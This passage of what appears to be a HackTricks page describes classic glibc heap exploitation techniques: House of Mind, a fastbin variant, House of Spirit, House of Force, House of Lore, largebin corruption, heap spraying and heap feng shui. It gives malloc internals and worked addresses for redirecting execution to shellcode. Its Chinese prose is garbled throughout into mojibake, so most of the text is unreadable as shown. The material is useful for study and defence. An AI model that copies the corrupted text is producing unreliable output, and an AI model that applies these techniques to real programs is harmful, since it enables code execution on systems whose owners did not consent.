mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> è¿”å›æŒ‡å‘å—å¼€å¤´çš„æŒ‡é’ˆï¼ˆmem-8ï¼‰

â€¦

ar\_ptr = arena\_for\_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

åœ¨\[1]ä¸­æ£€æŸ¥sizeå­—æ®µçš„NON\_MAIN\_ARENAä½ï¼Œå¯ä»¥æ›´æ”¹ä»¥ä½¿æ£€æŸ¥è¿”å›trueå¹¶æ‰§è¡Œheap\_for\_ptr()ï¼Œè¯¥å‡½æ•°å¯¹â€œmemâ€è¿›è¡Œä¸æ“ä½œï¼Œå°†æœ€ä¸é‡è¦çš„2.5å­—èŠ‚è®¾ç½®ä¸º0ï¼ˆåœ¨æˆ‘ä»¬çš„æƒ…å†µä¸‹ï¼Œä»0x0804a000åˆ°0x08000000ï¼‰ï¼Œç„¶åè®¿é—®0x08000000->ar\_ptrï¼ˆå°±åƒæ˜¯ä¸€ä¸ªheap\_infoç»“æ„ä½“ï¼‰

å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶ä¸€ä¸ªå—ï¼Œä¾‹å¦‚åœ¨0x0804a000å¤„ï¼Œå¹¶ä¸”å°†åœ¨**0x081002a0**å¤„é‡Šæ”¾ä¸€ä¸ªå—ï¼Œæˆ‘ä»¬å¯ä»¥åˆ°è¾¾0x08100000åœ°å€å¹¶å†™å…¥ä»»ä½•å†…å®¹ï¼Œä¾‹å¦‚**0x0804a000**ã€‚å½“é‡Šæ”¾ç¬¬äºŒå—æ—¶ï¼Œheap\_for\_ptr(ptr)->ar\_ptrå°†è¿”å›æˆ‘ä»¬åœ¨0x08100000å¤„å†™å…¥çš„å†…å®¹ï¼ˆå› ä¸ºå®ƒåº”ç”¨äºä¹‹å‰çœ‹åˆ°çš„andæ“ä½œï¼Œä»é‚£é‡Œæå–å‰4ä¸ªå­—èŠ‚çš„å€¼ï¼Œar\_ptrï¼‰

å› æ­¤ï¼Œè°ƒç”¨\_int\_free(ar\_ptr, mem)ï¼Œå³**\_int\_free(0x0804a000, 0x081002a0)**\
\*_\_int\_free(mstate av, Void\_t_ mem){\*\*\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

å¦‚å‰æ‰€è¿°ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶avçš„å€¼ï¼Œå› ä¸ºå®ƒæ˜¯æˆ‘ä»¬åœ¨å°†è¦é‡Šæ”¾çš„å—ä¸­å†™å…¥çš„å†…å®¹ã€‚

æ­£å¦‚unsorted\_chunksæ‰€å®šä¹‰çš„é‚£æ ·ï¼Œæˆ‘ä»¬çŸ¥é“ï¼š\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

å› æ­¤ï¼Œå¦‚æœåœ¨av->bins\[2]ä¸­å†™å…¥\_\_DTOR\_END\_\_-12çš„å€¼ï¼Œæœ€åä¸€æ¡æŒ‡ä»¤å°†åœ¨\_\_DTOR\_END\_\_ä¸­å†™å…¥ç¬¬äºŒå—çš„åœ°å€ã€‚

ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ç¬¬ä¸€å—ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å¼€å¤´å¤šæ¬¡å†™å…¥\_\_DTOR\_END\_\_-12çš„åœ°å€ï¼Œå› ä¸ºav->bins\[2]å°†ä»é‚£é‡Œè·å–å€¼ã€‚

åœ¨ç¬¬äºŒå—åœ°å€çš„æœ€å5ä¸ªé›¶çš„ä½ç½®ï¼Œæˆ‘ä»¬éœ€è¦å†™å…¥ç¬¬ä¸€å—çš„åœ°å€ï¼Œä»¥ä¾¿heap\_for\_ptr()è®¤ä¸ºar\_pträ½äºç¬¬ä¸€å—çš„å¼€å¤´ï¼Œå¹¶ä»é‚£é‡Œè·å–av->bins\[2]çš„å€¼ã€‚ åœ¨ç¬¬äºŒéƒ¨åˆ†ä¸­ï¼Œå€ŸåŠ©ç¬¬ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬ç”¨jump 0x0cè¦†ç›–äº†prev\_sizeï¼Œå¹¶ç”¨æŸä¸ªå€¼æ¿€æ´»äº†size -> NON\_MAIN\_ARENAã€‚

æ¥ç€ï¼Œåœ¨ç¬¬äºŒéƒ¨åˆ†ä¸­æ”¾å…¥å¤§é‡çš„nopsï¼Œæœ€ååŠ å…¥shellcodeã€‚

è¿™æ ·å°±ä¼šè°ƒç”¨ \_int\_free(TROZO1, TROZO2)ï¼Œå¹¶æŒ‰ç…§æŒ‡ä»¤å°†TROZO2çš„prev\_sizeåœ°å€å†™å…¥\_\_DTOR\_END\_\_ï¼Œä»è€Œè·³è½¬åˆ°shellcodeã€‚

è¦åº”ç”¨è¿™ç§æŠ€æœ¯ï¼Œéœ€è¦æ»¡è¶³ä¸€äº›é¢å¤–è¦æ±‚ï¼Œä½¿payloadå˜å¾—æ›´åŠ å¤æ‚ã€‚

è¿™ç§æŠ€æœ¯å·²ä¸å†é€‚ç”¨ï¼Œå› ä¸ºå‡ ä¹åº”ç”¨äº†ä¸unlinkç›¸åŒçš„è¡¥ä¸ã€‚æ–°æŒ‡å‘çš„ä½ç½®æ˜¯å¦ä¹ŸæŒ‡å‘å®ƒè‡ªå·±è¿›è¡Œæ¯”è¾ƒã€‚

**Fastbin**

è¿™æ˜¯The house of mindçš„ä¸€ä¸ªå˜ç§ã€‚

æˆ‘ä»¬å¸Œæœ›æ‰§è¡Œä»¥ä¸‹ä»£ç ï¼Œé€šè¿‡\_int\_free()å‡½æ•°çš„ç¬¬ä¸€ä¸ªæ£€æŸ¥ååˆ°è¾¾ï¼š

fb = &(av->fastbins\[fastbin\_index(size)] â€”> å…¶ä¸­fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

è¿™æ ·ï¼Œå¦‚æœå°†â€œfbâ€è®¾ç½®ä¸ºGOTä¸­æŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œç„¶ååœ¨è¯¥åœ°å€ä¸­æ”¾å…¥è¢«è¦†ç›–çš„åœ°å€ã€‚ä¸ºæ­¤ï¼Œéœ€è¦ç¡®ä¿arenaæ¥è¿‘dtorsçš„åœ°å€ã€‚å…·ä½“æ¥è¯´ï¼Œav->max\_faståº”è¯¥æ˜¯æˆ‘ä»¬è¦è¦†ç›–çš„åœ°å€ã€‚

ç”±äºThe House of Mindä¸­æˆ‘ä»¬å‘ç°æˆ‘ä»¬æ§åˆ¶äº†avçš„ä½ç½®ã€‚

å› æ­¤ï¼Œå¦‚æœåœ¨sizeå­—æ®µä¸­æ”¾å…¥ä¸€ä¸ªå€¼ä¸º8 + NON\_MAIN\_ARENA + PREV\_INUSEçš„å¤§å° -> fastbin\_index()å°†è¿”å›fastbins\[-1]ï¼Œå®ƒå°†æŒ‡å‘av->max\_fastã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œav->max\_fastå°†è¢«è¦†ç›–ï¼ˆè€Œä¸æ˜¯æŒ‡å‘çš„åœ°å€ï¼Œè€Œæ˜¯è¢«è¦†ç›–çš„ä½ç½®ï¼‰ã€‚

æ­¤å¤–ï¼Œé‡Šæ”¾çš„ç›¸é‚»å—çš„å¤§å°å¿…é¡»å¤§äº8 -> å› ä¸ºæˆ‘ä»¬å·²ç»è¯´è¿‡é‡Šæ”¾å—çš„å¤§å°ä¸º8ï¼Œåœ¨è¿™ä¸ªè™šå‡å—ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦æ”¾å…¥ä¸€ä¸ªå¤§äº8çš„å¤§å°ï¼ˆç”±äºshellcodeå°†æ”¾åœ¨é‡Šæ”¾çš„å—ä¸­ï¼Œå› æ­¤éœ€è¦åœ¨è™šå‡å—çš„sizeå­—æ®µä¹‹åæ”¾å…¥ä¸€ä¸ªè·³è½¬åˆ°nopsçš„jmpæŒ‡ä»¤ï¼‰ã€‚

æ­¤å¤–ï¼Œè¿™ä¸ªè™šå‡å—çš„å¤§å°å¿…é¡»å°äºav->system\_memã€‚av->system\_memæ¯”è¿™ä¸ªåœ°å€é«˜1848å­—èŠ‚ã€‚

ç”±äº\_DTOR\_END\_ä¸­çš„ç©ºå€¼å’ŒGOTä¸­çš„åœ°å€å¾ˆå°‘ï¼Œè¿™äº›éƒ¨åˆ†çš„ä»»ä½•åœ°å€éƒ½ä¸é€‚åˆè¢«è¦†ç›–ï¼Œå› æ­¤è®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•åº”ç”¨fastbinæ¥æ”»å‡»å †æ ˆã€‚

å¦ä¸€ç§æ”»å‡»æ–¹å¼æ˜¯å°†**av**é‡å®šå‘åˆ°å †æ ˆã€‚

å¦‚æœå°†sizeä¿®æ”¹ä¸º16è€Œä¸æ˜¯8ï¼Œåˆ™fastbin\_index()å°†è¿”å›fastbins\[0]ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥è¦†ç›–å †æ ˆã€‚

ä¸ºæ­¤ï¼Œå †æ ˆä¸­ä¸åº”è¯¥æœ‰ä»»ä½•canaryæˆ–å¥‡æ€ªçš„å€¼ï¼Œå®é™…ä¸Šæˆ‘ä»¬å¿…é¡»å¤„äºè¿™ç§æƒ…å†µï¼š4ä¸ªç©ºå­—èŠ‚ + EBP + RET

éœ€è¦è¿™4ä¸ªç©ºå­—èŠ‚æ˜¯å› ä¸º**av**å°†æŒ‡å‘è¿™ä¸ªåœ°å€ï¼Œè€Œ**av**çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯mutexï¼Œå¿…é¡»ä¸º0ã€‚

**av->max\_fast**å°†æ˜¯EBPï¼Œå¹¶ä¸”å°†æ˜¯ä¸€ä¸ªå€¼ï¼Œå¯ç”¨äºç»•è¿‡é™åˆ¶ã€‚

**av->fastbins\[0]å°†è¢«è¦†ç›–ä¸ºp**çš„åœ°å€ï¼Œå¹¶ä¸”å°†æˆä¸ºRETï¼Œä»è€Œè·³è½¬åˆ°shellcodeã€‚

æ­¤å¤–ï¼Œåœ¨**av->system\_mem**ï¼ˆæ¯”å †æ ˆä½ç½®é«˜1484å­—èŠ‚ï¼‰å°†æœ‰è¶³å¤Ÿçš„åƒåœ¾ï¼Œå¯å¸®åŠ©æˆ‘ä»¬ç»•è¿‡æ£€æŸ¥ã€‚

æ­¤å¤–ï¼Œé‡Šæ”¾çš„ç›¸é‚»å—çš„å¤§å°å¿…é¡»å¤§äº8 -> å› ä¸ºæˆ‘ä»¬å·²ç»è¯´è¿‡é‡Šæ”¾å—çš„å¤§å°ä¸º16ï¼Œåœ¨è¿™ä¸ªè™šå‡å—ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦æ”¾å…¥ä¸€ä¸ªå¤§äº8çš„å¤§å°ï¼ˆç”±äºshellcodeå°†æ”¾åœ¨é‡Šæ”¾çš„å—ä¸­ï¼Œå› æ­¤éœ€è¦åœ¨è™šå‡å—çš„sizeå­—æ®µä¹‹åæ”¾å…¥ä¸€ä¸ªè·³è½¬åˆ°nopsçš„jmpæŒ‡ä»¤ï¼‰ã€‚

**The House of Spirit**

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›æœ‰ä¸€ä¸ªæŒ‡å‘mallocçš„æŒ‡é’ˆï¼Œå¯ä»¥è¢«æ”»å‡»è€…ä¿®æ”¹ï¼ˆä¾‹å¦‚ï¼ŒæŒ‡é’ˆä½äºå †æ ˆä¸Šï¼Œå¯èƒ½åœ¨å˜é‡æº¢å‡ºä¸‹é¢ï¼‰ã€‚

å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘ä»»ä½•åœ°æ–¹ã€‚ç„¶è€Œï¼Œå¹¶éæ‰€æœ‰ä½ç½®éƒ½æ˜¯æœ‰æ•ˆçš„ï¼Œè™šå‡å—çš„å¤§å°å¿…é¡»å°äºav->max\_fastï¼Œå¹¶ä¸”æ›´å…·ä½“åœ°ç­‰äºæœªæ¥malloc()è°ƒç”¨è¯·æ±‚çš„å¤§å°åŠ 8ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“åœ¨è¿™ä¸ªè„†å¼±æŒ‡é’ˆä¹‹åä¼šè°ƒç”¨malloc(40)ï¼Œé‚£ä¹ˆè™šå‡å—çš„å¤§å°å¿…é¡»ç­‰äº48ã€‚

ä¾‹å¦‚ï¼Œå¦‚æœç¨‹åºè¦æ±‚ç”¨æˆ·è¾“å…¥ä¸€ä¸ªæ•°å­—ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥48ï¼Œå¹¶å°†å¯ä¿®æ”¹çš„mallocæŒ‡é’ˆæŒ‡å‘æ¥ä¸‹æ¥çš„4ä¸ªå­—èŠ‚ï¼ˆå¯èƒ½å±äºEBPï¼Œè¿™æ ·48å°±ä¼šç•™åœ¨åé¢ï¼Œå°±åƒæ˜¯sizeå¤´éƒ¨ä¸€æ ·ï¼‰ã€‚æ­¤å¤–ï¼Œptr-4+48çš„åœ°å€å¿…é¡»æ»¡è¶³å‡ ä¸ªæ¡ä»¶ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ptr=EBPï¼‰ï¼Œå³ 8 < ptr-4+48 < av->system\_memã€‚

å¦‚æœè¿™äº›æ¡ä»¶æ»¡è¶³ï¼Œå½“è°ƒç”¨æˆ‘ä»¬è¯´è¿‡çš„ä¸‹ä¸€ä¸ªmallocï¼Œå³malloc(40)æ—¶ï¼Œå®ƒå°†æŠŠEBPçš„åœ°å€åˆ†é…ä¸ºåœ°å€ã€‚å¦‚æœæ”»å‡»è€…è¿˜å¯ä»¥æ§åˆ¶å†™å…¥è¿™ä¸ªmallocçš„å†…å®¹ï¼Œå¯ä»¥è¦†ç›–EBPå’ŒEIPçš„åœ°å€ä¸ºä»»æ„åœ°å€ã€‚

æˆ‘è®¤ä¸ºè¿™æ˜¯å› ä¸ºè¿™æ ·å½“è°ƒç”¨free()æ—¶ï¼Œå®ƒä¼šä¿å­˜æŒ‡å‘å †æ ˆEBPçš„åœ°å€ï¼ŒæŒ‡ç¤ºå †æ ˆä¸­æœ‰ä¸€ä¸ªå®Œç¾å¤§å°çš„æ–°malloc()å—ï¼Œå› æ­¤å°†åˆ†é…è¯¥åœ°å€ã€‚

**The House of Force**

éœ€è¦ï¼š

* æº¢å‡ºåˆ°ä¸€ä¸ªå…è®¸è¦†ç›–wildernessçš„å—
* ä½¿ç”¨ç”¨æˆ·å®šä¹‰å¤§å°è°ƒç”¨malloc()
* è°ƒç”¨malloc()çš„æ•°æ®å¯ä»¥ç”±ç”¨æˆ·å®šä¹‰

é¦–å…ˆï¼Œå°†wildernesså—çš„å¤§å°è¦†ç›–ä¸ºä¸€ä¸ªéå¸¸å¤§çš„å€¼ï¼ˆ0xffffffffï¼‰ï¼Œè¿™æ ·ä»»ä½•è¶³å¤Ÿå¤§çš„å†…å­˜è¯·æ±‚éƒ½å°†åœ¨\_int\_malloc()ä¸­å¤„ç†ï¼Œè€Œæ— éœ€æ‰©å±•å †ã€‚

å…¶æ¬¡ï¼Œä¿®æ”¹av->topï¼Œä½¿å…¶æŒ‡å‘æ”»å‡»è€…æ§åˆ¶çš„å†…å­˜åŒºåŸŸï¼Œå¦‚å †æ ˆã€‚åœ¨av->topä¸­ï¼Œå°†æ”¾ç½®\&EIP - 8ã€‚

æˆ‘ä»¬å¿…é¡»è¦†ç›–av->topï¼Œä½¿å…¶æŒ‡å‘æ”»å‡»è€…æ§åˆ¶çš„å†…å­˜åŒºåŸŸï¼š

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victimè·å–å½“å‰wildernesså—çš„åœ°å€ï¼ˆå½“å‰av->topï¼‰ï¼Œremainderæ­£å¥½æ˜¯è¯¥åœ°å€åŠ ä¸Šmalloc()è¯·æ±‚çš„å­—èŠ‚æ•°ã€‚å› æ­¤ï¼Œå¦‚æœ\&EIP-8åœ¨0xbffff224ï¼Œav->topåŒ…å«0x080c2788ï¼Œåˆ™ä¸ºäº†ä½¿av->topæŒ‡å‘$EIP-8ä»¥ä¾›ä¸‹ä¸€ä¸ªmalloc()ä½¿ç”¨ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å—æ§mallocä¸­ä¿ç•™çš„å­—èŠ‚æ•°ä¸ºï¼š

0xbffff224 - 0x080c2788 = 3086207644ã€‚

è¿™æ ·å°±ä¿å­˜äº†ä¿®æ”¹åçš„av->topå€¼ï¼Œä¸‹ä¸€ä¸ªmallocå°†æŒ‡å‘EIPï¼Œå¹¶ä¸”å¯ä»¥è¢«è¦†ç›–ã€‚

é‡è¦çš„æ˜¯æ–°wildernesså—çš„å¤§å°è¦å¤§äºæœ€åä¸€ä¸ªmalloc()è¯·æ±‚çš„å¤§å°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœwildernessæŒ‡å‘\&EIP-8ï¼Œé‚£ä¹ˆå¤§å°å°†æ­£å¥½åœ¨å †æ ˆçš„EBPå­—æ®µä¸Šã€‚

**The House of Lore**

**SmallBin Corruption**

é‡Šæ”¾çš„å—æ ¹æ®å¤§å°æ”¾å…¥ä¸åŒçš„binä¸­ã€‚ä½†åœ¨æ”¾å…¥ä¹‹å‰ï¼Œå®ƒä»¬ä¼šè¢«ä¿å­˜åœ¨unsorted binsä¸­ã€‚é‡Šæ”¾å—ä¸ä¼šç«‹å³æ”¾å…¥å…¶binä¸­ï¼Œè€Œæ˜¯ç•™åœ¨unsorted binsä¸­ã€‚ç„¶åï¼Œå¦‚æœåˆ†é…æ–°å—å¹¶ä¸”å…ˆå‰é‡Šæ”¾çš„å—å¯ä»¥æ»¡è¶³éœ€æ±‚ï¼Œåˆ™å°†å…¶è¿”å›ï¼Œä½†å¦‚æœåˆ†é…æ›´å¤§çš„å—ï¼Œåˆ™å°†unsorted binsä¸­çš„é‡Šæ”¾å—æ”¾å…¥é€‚å½“çš„binä¸­ã€‚

è¦è¾¾åˆ°æ˜“å—æ”»å‡»çš„ä»£ç ï¼Œå†…å­˜è¯·æ±‚å¿…é¡»å¤§äºav->max\_fastï¼ˆé€šå¸¸ä¸º72ï¼‰ï¼Œä½†å°äºMIN\_LARGE\_SIZEï¼ˆ512ï¼‰ã€‚ å¦‚æœåœ¨binä¸­æœ‰ä¸€ä¸ªå¤§å°é€‚å½“çš„å—ï¼Œåˆ™åœ¨è§£ç»‘å®šåè¿”å›è¯¥å—ï¼š

bck = victim->bk; æŒ‡å‘å‰ä¸€ä¸ªå—ï¼Œè¿™æ˜¯æˆ‘ä»¬å”¯ä¸€å¯ä»¥æ›´æ”¹çš„ä¿¡æ¯ã€‚

bin->bk = bck; å€’æ•°ç¬¬äºŒå—å˜ä¸ºæœ€åä¸€å—ï¼Œå¦‚æœbckæŒ‡å‘å †æ ˆä¸­çš„ä¸‹ä¸€ä¸ªå·²åˆ†é…å—ï¼Œåˆ™å°†å…¶åœ°å€åˆ†é…ç»™æ­¤å—

bck->fd = bin; é€šè¿‡ä½¿å…¶æŒ‡å‘binæ¥å…³é—­åˆ—è¡¨

éœ€è¦ï¼š

* é¢„ç•™ä¸¤ä¸ªmallocï¼Œä»¥ä¾¿åœ¨ç¬¬äºŒä¸ªmallocè¢«é‡Šæ”¾å¹¶æ”¾å…¥å…¶binåï¼Œå¯ä»¥å¯¹ç¬¬ä¸€ä¸ªmallocè¿›è¡Œæº¢å‡ºï¼ˆå³åœ¨æº¢å‡ºä¹‹å‰å·²ç»åˆ†é…äº†ä¸€ä¸ªæ›´å¤§çš„mallocï¼‰
* æ”»å‡»è€…éœ€è¦æ§åˆ¶è¢«æ”»å‡»è€…é€‰æ‹©çš„åœ°å€çš„mallocåˆ†é…

ç›®æ ‡æ˜¯ï¼šå¦‚æœæˆ‘ä»¬å¯ä»¥å¯¹å…·æœ‰ä¸‹æ–¹å·²é‡Šæ”¾å—å¹¶åœ¨å…¶binä¸­çš„å †è¿›è¡Œæº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ”¹å…¶bkæŒ‡é’ˆã€‚å¦‚æœæˆ‘ä»¬æ›´æ”¹å…¶bkæŒ‡é’ˆï¼Œå¹¶ä¸”æ­¤å—æˆä¸ºbinåˆ—è¡¨çš„ç¬¬ä¸€ä¸ªå—å¹¶è¢«åˆ†é…ï¼Œåˆ™binå°†è¢«æ¬ºéª—ï¼Œå¹¶å‘Šè¯‰å…¶åˆ—è¡¨çš„æœ€åä¸€ä¸ªå—ï¼ˆå³ä¸‹ä¸€ä¸ªè¦æä¾›çš„å—ï¼‰ä½äºæˆ‘ä»¬è®¾ç½®çš„è™šå‡åœ°å€ï¼ˆä¾‹å¦‚å †æ ˆæˆ–GOTï¼‰ã€‚å› æ­¤ï¼Œå¦‚æœå†æ¬¡åˆ†é…å¦ä¸€ä¸ªå—å¹¶ä¸”æ”»å‡»è€…å¯¹å…¶å…·æœ‰æƒé™ï¼Œåˆ™å°†åœ¨æ‰€éœ€ä½ç½®ç»™å‡ºä¸€ä¸ªå—ï¼Œå¹¶ä¸”å¯ä»¥åœ¨å…¶ä¸­å†™å…¥ã€‚

é‡Šæ”¾ä¿®æ”¹åçš„å—åï¼Œéœ€è¦é¢„ç•™ä¸€ä¸ªæ¯”é‡Šæ”¾çš„å—æ›´å¤§çš„å—ï¼Œè¿™æ ·ä¿®æ”¹åçš„å—å°†ç¦»å¼€æœªæ’åºçš„binå¹¶å°†å…¶æ”¾å…¥å…¶binä¸­ã€‚

ä¸€æ—¦åœ¨å…¶binä¸­ï¼Œå°±æ˜¯ä¿®æ”¹å…¶bkæŒ‡é’ˆçš„æ—¶å€™é€šè¿‡æº¢å‡ºã€‚è¿™æ ·ï¼Œbinå¿…é¡»ç­‰å¾…è°ƒç”¨è¶³å¤Ÿå¤šæ¬¡malloc()ï¼Œä»¥ä¾¿å†æ¬¡ä½¿ç”¨ä¿®æ”¹åçš„binå¹¶æ¬ºéª—binï¼Œä½¿å…¶ç›¸ä¿¡ä¸‹ä¸€ä¸ªå—ä½äºè™šå‡åœ°å€ã€‚ç„¶åå°†æä¾›æˆ‘ä»¬æ„Ÿå…´è¶£çš„å—ã€‚

ä¸ºäº†å°½å¿«æ‰§è¡Œæ¼æ´ï¼Œç†æƒ³æƒ…å†µæ˜¯ï¼šé¢„ç•™æ˜“å—æ”»å‡»çš„å—ï¼Œé¢„ç•™å°†è¢«ä¿®æ”¹çš„å—ï¼Œé‡Šæ”¾æ­¤å—ï¼Œé¢„ç•™æ¯”å°†è¢«ä¿®æ”¹çš„å—æ›´å¤§çš„å—ï¼Œä¿®æ”¹å—ï¼ˆæ¼æ´ï¼‰ï¼Œé¢„ç•™ä¸å—æ”»å‡»å—ç›¸åŒå¤§å°çš„å—ï¼Œå¹¶é¢„ç•™ç¬¬äºŒä¸ªç›¸åŒå¤§å°çš„å—ï¼Œè¿™å°†æŒ‡å‘æ‰€é€‰åœ°å€ã€‚

ä¸ºäº†ä¿æŠ¤æ­¤æ”»å‡»ï¼Œä½¿ç”¨äº†å…¸å‹çš„æ£€æŸ¥â€œä¸â€æ˜¯è™šå‡å—çš„æ–¹æ³•ï¼šæ£€æŸ¥bck->fdæ˜¯å¦æŒ‡å‘victimã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æˆ‘ä»¬çš„æƒ…å†µä¸‹ï¼Œå¦‚æœå †æ ˆä¸­æŒ‡å‘è™šå‡å—çš„fdæŒ‡é’ˆæŒ‡å‘victimã€‚ä¸ºäº†ç»•è¿‡æ­¤ä¿æŠ¤ï¼Œæ”»å‡»è€…åº”è¯¥èƒ½å¤Ÿä»¥æŸç§æ–¹å¼ï¼ˆå¯èƒ½é€šè¿‡å †æ ˆï¼‰åœ¨é€‚å½“çš„åœ°å€ä¸Šå†™å…¥victimçš„åœ°å€ã€‚è¿™æ ·çœ‹èµ·æ¥å°±åƒæ˜¯ä¸€ä¸ªçœŸå®çš„å—ã€‚

**CorrupciÃ³n LargeBin**

éœ€è¦ä¸ä¹‹å‰ç›¸åŒçš„è¦æ±‚ä»¥åŠæ›´å¤šè¦æ±‚ï¼Œæ­¤å¤–ï¼Œé¢„ç•™çš„å—å¤§å°å¿…é¡»å¤§äº512ã€‚

æ”»å‡»ä¸å‰ä¸€ä¸ªæ”»å‡»ç±»ä¼¼ï¼Œå³éœ€è¦ä¿®æ”¹bkæŒ‡é’ˆå¹¶éœ€è¦æ‰€æœ‰è¿™äº›malloc()è°ƒç”¨ï¼Œä½†è¿˜éœ€è¦ä¿®æ”¹ä¿®æ”¹åçš„å—çš„å¤§å°ï¼Œä½¿å¾—size - nb < MINSIZEã€‚

ä¾‹å¦‚ï¼Œå°†sizeè®¾ç½®ä¸º1552ï¼Œä½¿å¾—1552 - 1544 = 8 < MINSIZEï¼ˆå‡æ³•ä¸èƒ½ä¸ºè´Ÿï¼Œå› ä¸ºunsignedè¿›è¡Œæ¯”è¾ƒï¼‰

æ­¤å¤–ï¼Œå·²ç»å¼•å…¥äº†ä¸€ä¸ªè¡¥ä¸ï¼Œä½¿å…¶æ›´åŠ å¤æ‚ã€‚

**Heap Spraying**

åŸºæœ¬ä¸Šæ˜¯ä¸ºå †ä¸­å°½å¯èƒ½å¤šåœ°é¢„ç•™å†…å­˜ï¼Œå¹¶ç”¨ä»¥shellcodeç»“å°¾çš„nopå¡«å……è¿™äº›å†…å­˜ã€‚æ­¤å¤–ï¼Œå°†0x0cç”¨ä½œå¡«å……ã€‚å› æ­¤ï¼Œå°†å°è¯•è·³è½¬åˆ°åœ°å€0x0c0c0c0cï¼Œå› æ­¤ï¼Œå¦‚æœè¦†ç›–äº†å°†è¦è°ƒç”¨çš„ä»»ä½•åœ°å€ï¼Œåˆ™å°†è·³è½¬åˆ°é‚£é‡Œã€‚åŸºæœ¬ä¸Šï¼Œç­–ç•¥æ˜¯å°½å¯èƒ½å¤šåœ°é¢„ç•™å†…å­˜ï¼Œä»¥æŸ¥çœ‹æ˜¯å¦è¦†ç›–äº†ä»»ä½•æŒ‡é’ˆï¼Œå¹¶è·³è½¬åˆ°0x0c0c0c0cï¼Œå¸Œæœ›é‚£é‡Œæœ‰nopã€‚

**Heap Feng Shui**

é€šè¿‡é¢„ç•™å’Œé‡Šæ”¾æ¥å·©å›ºå†…å­˜ï¼Œä½¿å¾—åœ¨ç©ºé—²å—ä¹‹é—´ç•™ä¸‹å·²é¢„ç•™çš„å—ã€‚è¦æº¢å‡ºçš„ç¼“å†²åŒºå°†ä½äºå…¶ä¸­ä¸€ä¸ªå—ä¸­ã€‚

## æœ‰è¶£çš„è¯¾ç¨‹

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **å‚è€ƒèµ„æ–™**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS Family**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Š**å…³æ³¨æˆ‘ä»¬ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
